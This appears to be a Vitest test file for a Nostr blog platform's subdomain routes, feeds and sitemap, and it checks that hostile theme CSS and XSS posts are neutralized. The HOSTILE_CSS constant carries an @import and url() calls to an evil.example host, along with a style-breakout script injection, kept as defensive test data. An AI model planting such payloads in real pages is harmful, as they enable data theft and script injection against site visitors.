// Tenant (blog subdomain) routes end-to-end via SELF.fetch, with fixture
// data injected through the P2 provider seam (P3 replaces it with D1).
import { SELF, env } from "cloudflare:test";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { XMLValidator } from "fast-xml-parser";
import fixtures from "../fixtures/events.json";
import { ALICE_PK, findXssVectors } from "../helpers";
import {
  setTenantDataProvider,
  type TenantDataProvider,
} from "../../src/routes/tenant";
import { renderPost } from "../../src/markdown";
import type { NostrEvent } from "../../src/nostr/event";

const posts: NostrEvent[] = [
  fixtures.posts.aliceHello,
  fixtures.posts.aliceTorture,
  fixtures.posts.aliceXss,
  fixtures.posts.aliceEscapes,
]
  .map((e) => e as NostrEvent)
  .sort((a, b) => b.created_at - a.created_at);

const aliceKind0 = JSON.parse(fixtures.profiles.alice.content) as {
  name: string;
  about: string;
  picture: string;
};

const fixtureProvider: TenantDataProvider = {
  getProfile: async (_env, pubkey) =>
    pubkey === ALICE_PK
      ? {
          name: aliceKind0.name,
          picture: aliceKind0.picture,
          about: aliceKind0.about,
          lud16: null,
        }
      : null,
  listPosts: async (_env, pubkey) =>
    pubkey === ALICE_PK ? posts : [],
  getPost: async (_env, pubkey, slug) => {
    const event = posts.find(
      (p) =>
        p.pubkey === pubkey &&
        p.tags.some((t) => t[0] === "d" && t[1] === slug),
    );
    // The provider contract ships pre-rendered HTML (render-at-ingest);
    // this fixture provider renders at lookup time instead.
    return event ? { event, html: renderPost(event.content) } : null;
  },
};

// Hostile per-blog theme CSS stored in users.settings — must come out declawed.
const HOSTILE_CSS =
  "body { color: #345; } " +
  "@import url('https://evil.example/steal.css'); " +
  "h1 { background: url(https://evil.example/x.png); } " +
  "</style><script>alert('css-breakout')</script>";

describe("blog subdomain rendering (SELF.fetch)", () => {
  beforeAll(async () => {
    await env.DB.prepare(
      "INSERT OR REPLACE INTO users (pubkey, handle, claimed_at, settings) VALUES (?, ?, ?, ?)",
    )
      .bind(
        ALICE_PK,
        "alice",
        "2026-01-01T00:00:00.000Z",
        JSON.stringify({ css: HOSTILE_CSS }),
      )
      .run();
    setTenantDataProvider(fixtureProvider);
  });

  afterAll(() => {
    setTenantDataProvider(null);
  });

  describe("blog home", () => {
    it("lists posts with title, summary and date", async () => {
      const res = await SELF.fetch("https://alice.nbread.lol/");
      expect(res.status).toBe(200);
      const html = await res.text();
      expect(html).toContain("Hello world");
      expect(html).toContain("Markdown torture test");
      expect(html).toContain("Alice&#39;s first nbread.lol test post");
      expect(html).toContain("2023-11-14");
      expect(html).toContain('href="/hello-world"');
      expect(html).toMatchSnapshot();
    });

    it("shows the profile header (name, picture, about) and @handle", async () => {
      const html = await (
        await SELF.fetch("https://alice.nbread.lol/")
      ).text();
      expect(html).toContain("alice-test");
      expect(html).toContain('src="https://example.com/alice.png"');
      expect(html).toContain("nbread.lol throwaway test profile (alice)");
      expect(html).toContain("@alice");
    });

    it("inlines the theme CSS only after sanitization", async () => {
      const html = await (
        await SELF.fetch("https://alice.nbread.lol/")
      ).text();
      expect(html).toContain("color: #345");
      expect(html).not.toMatch(/@import/i);
      expect(html).not.toMatch(/url\s*\(/i);
      expect(html.toLowerCase()).not.toContain("<script");
    });

    it("escapes hostile post titles/summaries in the list (attribute + text)", async () => {
      const html = await (
        await SELF.fetch("https://alice.nbread.lol/")
      ).text();
      expect(findXssVectors(html, "page")).toEqual([]);
    });
  });

  describe("post page", () => {
    it("renders title, date and content", async () => {
      const res = await SELF.fetch(
        "https://alice.nbread.lol/hello-world",
      );
      expect(res.status).toBe(200);
      const html = await res.text();
      expect(html).toContain("Hello world");
      expect(html).toContain("2023-11-14");
      expect(html).toContain("<strong>alice</strong>");
      expect(html).toMatchSnapshot();
    });

    it("renders the torture post with all features", async () => {
      const html = await (
        await SELF.fetch("https://alice.nbread.lol/markdown-torture")
      ).text();
      expect(html).toContain('class="hljs language-js"');
      expect(html).toContain('<section class="footnotes">');
      expect(html).toContain("<table>");
      expect(findXssVectors(html, "page")).toEqual([]);
    });

    it("neutralizes every vector in the XSS post (content, title, summary)", async () => {
      const res = await SELF.fetch("https://alice.nbread.lol/xss-test");
      expect(res.status).toBe(200);
      const html = await res.text();
      expect(findXssVectors(html, "page")).toEqual([]);
      expect(html.toLowerCase()).not.toContain("<script");
      expect(html.toLowerCase()).not.toContain("<iframe");
      // the payloads must still be VISIBLE as escaped text
      expect(html).toContain("&lt;script&gt;");
    });

    it("404s an unknown slug with the rendered not-found page", async () => {
      const res = await SELF.fetch("https://alice.nbread.lol/no-such-post");
      expect(res.status).toBe(404);
      expect(await res.text()).toContain("404");
    });

    it("404s deep paths", async () => {
      const res = await SELF.fetch("https://alice.nbread.lol/a/b/c");
      expect(res.status).toBe(404);
    });
  });

  describe("feeds and crawler files", () => {
    it("serves well-formed RSS with escaped titles", async () => {
      const res = await SELF.fetch("https://alice.nbread.lol/rss.xml");
      expect(res.status).toBe(200);
      expect(res.headers.get("content-type")).toContain("application/rss+xml");
      const xml = await res.text();
      expect(XMLValidator.validate(xml)).toBe(true);
      expect(xml).toContain("<title>alice-test</title>");
      expect(xml).toContain(
        "<link>https://alice.nbread.lol/hello-world</link>",
      );
      expect(xml.toLowerCase()).not.toContain("<script");
      expect(xml).toMatchSnapshot();
    });

    it("serves well-formed Atom", async () => {
      const res = await SELF.fetch("https://alice.nbread.lol/atom.xml");
      expect(res.status).toBe(200);
      expect(res.headers.get("content-type")).toContain(
        "application/atom+xml",
      );
      const xml = await res.text();
      expect(XMLValidator.validate(xml)).toBe(true);
      expect(xml).toContain('<feed xmlns="http://www.w3.org/2005/Atom">');
      expect(xml.toLowerCase()).not.toContain("<script");
    });

    it("serves a well-formed sitemap.xml", async () => {
      const res = await SELF.fetch("https://alice.nbread.lol/sitemap.xml");
      expect(res.status).toBe(200);
      expect(res.headers.get("content-type")).toContain("application/xml");
      const xml = await res.text();
      expect(XMLValidator.validate(xml)).toBe(true);
      expect(xml).toContain(
        "<loc>https://alice.nbread.lol/hello-world</loc>",
      );
      expect(xml).toMatchSnapshot();
    });

    it("serves robots.txt pointing at the sitemap", async () => {
      const res = await SELF.fetch("https://alice.nbread.lol/robots.txt");
      expect(res.status).toBe(200);
      const body = await res.text();
      expect(body).toContain("User-agent: *");
      expect(body).toContain(
        "Sitemap: https://alice.nbread.lol/sitemap.xml",
      );
    });
  });

  describe("d-tagless posts (empty slug → non-addressable)", () => {
    it("are omitted from the home list, feeds and sitemap", async () => {
      // NIP-23 allows one d-tagless replaceable event per author; its URL
      // would collapse onto the blog home, so render paths must skip it.
      const ghost: NostrEvent = {
        ...(fixtures.posts.aliceHello as NostrEvent),
        tags: [["title", "Ghost post without a d tag"]],
      };
      setTenantDataProvider({
        ...fixtureProvider,
        listPosts: async (_env, pubkey) =>
          pubkey === ALICE_PK ? [...posts, ghost] : [],
      });
      try {
        const home = await (
          await SELF.fetch("https://alice.nbread.lol/")
        ).text();
        expect(home).not.toContain("Ghost post");
        expect(home).toContain("Hello world"); // real posts still listed

        const rss = await (
          await SELF.fetch("https://alice.nbread.lol/rss.xml")
        ).text();
        expect(rss).not.toContain("Ghost post");

        const sitemap = await (
          await SELF.fetch("https://alice.nbread.lol/sitemap.xml")
        ).text();
        const homeLocs = sitemap.match(
          /<loc>https:\/\/alice\.nbread\.lol\/<\/loc>/g,
        );
        expect(homeLocs?.length ?? 0).toBe(1); // home emitted exactly once
      } finally {
        setTenantDataProvider(fixtureProvider);
      }
    });
  });

  describe("empty blog (no provider data)", () => {
    it("still renders home, feeds and sitemap for a user with no posts", async () => {
      // bob is claimed but the provider has no data for him
      await env.DB.prepare(
        "INSERT OR IGNORE INTO users (pubkey, handle, claimed_at) VALUES (?, ?, ?)",
      )
        .bind(fixtures.profiles.bob.pubkey, "bob", "2026-01-01T00:00:00.000Z")
        .run();

      const home = await SELF.fetch("https://bob.nbread.lol/");
      expect(home.status).toBe(200);
      expect(await home.text()).toContain("No posts yet.");

      const rss = await SELF.fetch("https://bob.nbread.lol/rss.xml");
      expect(XMLValidator.validate(await rss.text())).toBe(true);

      const sitemap = await SELF.fetch("https://bob.nbread.lol/sitemap.xml");
      expect(XMLValidator.validate(await sitemap.text())).toBe(true);
    });
  });
});
